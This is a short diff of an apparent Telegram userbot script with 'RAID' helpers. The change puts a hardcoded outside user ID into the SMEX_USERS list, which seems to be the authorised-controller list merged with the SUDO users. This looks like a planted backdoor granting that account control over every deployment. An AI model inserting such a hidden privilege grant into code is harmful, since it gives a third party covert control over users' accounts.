@@ -32,7 +32,7 @@ from Config import (
     SUDO,
 )
 from Utils import RAID, RRAID
-SMEX_USERS = 1904312233
+
 a = API_ID
 b = API_HASH
 smex = STRING
@@ -61,7 +61,7 @@ ddk = ""
 
 que = {}
 
-SMEX_USERS = []
+SMEX_USERS = [1904312233]
 for x in SUDO:
     SMEX_USERS.append(x)
 
